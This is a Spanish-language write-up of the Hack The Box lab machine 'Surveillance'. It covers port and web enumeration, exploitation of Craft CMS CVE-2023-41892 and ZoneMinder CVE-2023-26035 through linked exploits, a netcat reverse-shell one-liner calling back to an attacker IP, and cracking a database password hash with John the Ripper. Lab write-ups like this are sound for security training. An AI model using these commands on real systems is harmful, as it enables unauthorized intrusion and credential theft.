---
description: https://app.hackthebox.com/machines/Surveillance
---

# 游릳 HTB - Surveillance

## **Enumeration**

**Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando settarget con la direcci칩n IP de la m치quina objetivo:

```bash
settarget 10.10.11.245 Surveillance
```

![](<../../.gitbook/assets/image (1) (1).png>)

\
**Ping de reconocimiento**

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n -R para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.239 -R
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones -p- para escanear todos los puertos, --open para mostrar solo los puertos abiertos, -sS para un escaneo de tipo TCP SYN, --min-rate 5000 para establecer la velocidad m칤nima de paquetes y -vvv para un nivel de verbosidad alto. Adem치s, utilizamos -n para desactivar la resoluci칩n de DNS, -Pn para no realizar el escaneo de ping, y -oG allPorts para guardar la salida en un archivo con formato Greppable:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.245 -oG allPorts
```

\
\
**Escaneo detallado con Nmap**

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n -sCV para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con -p \_\_PORTS\_\_ (reemplazando \_\_PORTS\_\_ con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre targeted:

```bash
sudo nmap -sCV -p22,80 10.10.11.245 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Para a침adir la entrada "10.10.11.245 surveillance.htb" al archivo /etc/hosts, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP 10.10.11.245 asociada al nombre de host surveillance.htb al archivo /etc/hosts de tu sistema.

#### Utilizando WhatWeb para Obtener Informaci칩n sobre el Objetivo

Para obtener m치s informaci칩n sobre nuestro objetivo, utilizamos la herramienta WhatWeb. Esta herramienta nos permite identificar tecnolog칤as web utilizadas en el servidor, como el sistema de gesti칩n de contenidos (CMS), el lenguaje de programaci칩n, los plugins y otras caracter칤sticas. Ejecutamos el siguiente comando:

```bash
whatweb http://surveillance.htb > whatweb && cat whatweb -l java
```

<div data-full-width="true">

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

Para realizar un descubrimiento de directorios en un sitio web utilizando Gobuster, puedes utilizar el siguiente comando:

```bash
gobuster dir -u http://surveillance.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Este comando utiliza Gobuster para realizar un escaneo de directorios en el sitio web http://surveillance.htb/. Utiliza el archivo de palabras /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt como lista de palabras clave para la b칰squeda. La opci칩n -t 50 indica que se deben utilizar 50 threads simult치neos para acelerar el proceso.

**TIP: Instalaci칩n de SecLists con apt-get**

Para instalar SecLists en sistemas basados en Debian (como Ubuntu) utilizando apt-get, puedes seguir estos pasos:

1.  Actualiza la lista de paquetes disponibles:

    ```bash
    sudo apt-get update
    ```
2.  Instala SecLists:

    ```bash
    sudo apt-get install seclists
    ```

Con estos pasos, SecLists se instalar치 en tu sistema y podr치s acceder a la lista de palabras clave en el directorio /usr/share/seclists/.



## Exploitation

Durante una de nuestras incursiones en la red, nos topamos con un hallazgo interesante: una direcci칩n espec칤fica que nos llev칩 directamente a un panel de administraci칩n de un sitio web: http://surveillance.htb/admin/login. Al inspeccionar la p치gina, nos dimos cuenta de que estaba potenciada por "CraftCMS", y a칰n m치s intrigante, la versi칩n se revelaba sin recato en el index.php como la 4.4.14.

Movidos por la curiosidad y el instinto de cazadores de vulnerabilidades, nos lanzamos a la vasta mar de informaci칩n que es internet, con la esperanza de desenterrar alg칰n dato 칰til sobre CraftCMS y sus posibles puntos d칠biles. No pas칩 mucho tiempo antes de que nuestra b칰squeda diera frutos: nos topamos con un CVE espec칤fico que parec칤a ser la llave para comprometer la versi칩n que ten칤amos enfrente: Craft CMS CVE-2023-41892. La fuente de esta revelaci칩n fue [este enlace](https://github.com/Faelian/CraftCMS\_CVE-2023-41892), que promet칤a ser el comienzo de una aventura a칰n m치s emocionante.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Ejecutamos el exploit sudo python3 craft-cms.py http://surveillance.htb/ y accedemos a una shell interactiva.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Para asegurar una shell robusta y poder ejecutar comandos de bash, se puede utilizar un one-liner que establezca una conexi칩n inversa o una sesi칩n interactiva. Este tipo de conexi칩n es 칰til cuando se ha conseguido ejecutar comandos de manera remota en una m치quina objetivo y se desea tener una interfaz de l칤nea de comandos m치s estable para interactuar con el sistema.

Uno de los one-liners m치s comunes para este prop칩sito utiliza bash para crear una shell inversa. Aqu칤 tienes un ejemplo:

{% content-ref url="../../otros/one-liner.md" %}
[one-liner.md](../../otros/one-liner.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 7777 >/tmp/f
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Despu칠s de pasar un buen rato explorando el sistema al que hab칤a ganado acceso, me top칠 con una joya oculta en /html/craft/storage/backups: un archivo .sql. Este tipo de archivo suele contener datos cruciales, como backups de la base de datos, que podr칤an revelar informaci칩n valiosa sobre la aplicaci칩n web y su estructura de datos. Sabiendo esto, decid칤 que era imperativo obtener una copia para un an치lisis m치s detallado.

Para hacer el archivo accesible y poder descargarlo, primero tuve que moverlo a un directorio desde el cual pudiera accederse p칰blicamente. La ubicaci칩n ideal para esto fue /html/craft/web, un directorio que sab칤a que era servido por el servidor web.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Interior del .sql</p></figcaption></figure>

Una vez que obtuvimos el archivo .sql y luego el hash, nuestro siguiente paso fue identificar el tipo de hash para determinar la mejor manera de crackearlo. Para esto, utilizamos la herramienta hash-identifier, que nos permiti칩 analizar el hash y determinar su posible algoritmo de hash subyacente.

El proceso de identificaci칩n fue sencillo y directo, y nos brind칩 informaci칩n valiosa sobre la naturaleza del hash, lo que nos permiti칩 elegir la mejor estrategia para descifrarlo.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Una vez identificado el tipo de hash como raw-sha256, procedimos a intentar crackearlo utilizando la herramienta John the Ripper. Esta herramienta es ampliamente utilizada para realizar ataques de fuerza bruta y diccionario contra contrase침as cifradas.

Ejecuci칩n de John the Ripper El comando utilizado para ejecutar John the Ripper y crackear el hash fue el siguiente:

{% code overflow="wrap" %}
```bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Intentamos ingresar por ssh con las credenciales de matthew@surveillance.htb y este es el resultado:

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Revisando las conexiones de la m치quina me percato de un servicio que est치 corriendo en el puerto 8080.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### SSH Local Port Forward

El "SSH Local Port Forward" es una t칠cnica que permite redirigir el tr치fico desde un puerto local en la m치quina cliente hacia un puerto espec칤fico en un servidor remoto a trav칠s de una conexi칩n SSH. Esta t칠cnica es 칰til para acceder a servicios en un servidor remoto que de otra manera no ser칤an accesibles directamente desde la m치quina cliente.

En el ejemplo dado, se utiliz칩 el siguiente comando para establecer un SSH Local Port Forward desde la m치quina cliente hacia el servidor remoto:

```bash
ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245
```

* \-L 2222:127.0.0.1:8080: especifica la redirecci칩n del tr치fico desde el puerto 2222 en la m치quina cliente hacia el puerto 8080 en la m치quina remota. El formato es -L \[puerto\_local]:\[host\_destino]:\[puerto\_destino].
* matthew@10.10.11.245: es el usuario y la direcci칩n IP del servidor remoto al que se va a conectar a trav칠s de SSH.

Despu칠s de ejecutar este comando, cualquier tr치fico que llegue al puerto 2222 en la m치quina cliente ser치 redirigido al puerto 8080 en el servidor remoto a trav칠s de la conexi칩n SSH. Esto permite acceder a servicios o aplicaciones que se ejecutan en el puerto 8080 del servidor remoto como si estuvieran siendo ejecutados localmente en el puerto 2222 de la m치quina cliente.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption><p>Accedemos a 127.0.0.1:2222</p></figcaption></figure>

Despu칠s de establecer la conexi칩n SSH local, decid칤 investigar si hab칤a alg칰n exploit disponible para ZoneMinder, y encontr칠 otro exploit relacionado con la ejecuci칩n remota de c칩digo (RCE). Puedes encontrar m치s informaci칩n sobre este exploit en el siguiente enlace: [CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035).

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Lo primero que se me ocurre hacer es un sudo -l

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Al parecer hay archivos en /usr/bin/ llamado zm\*.pl que podr칤an ser de ayuda:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
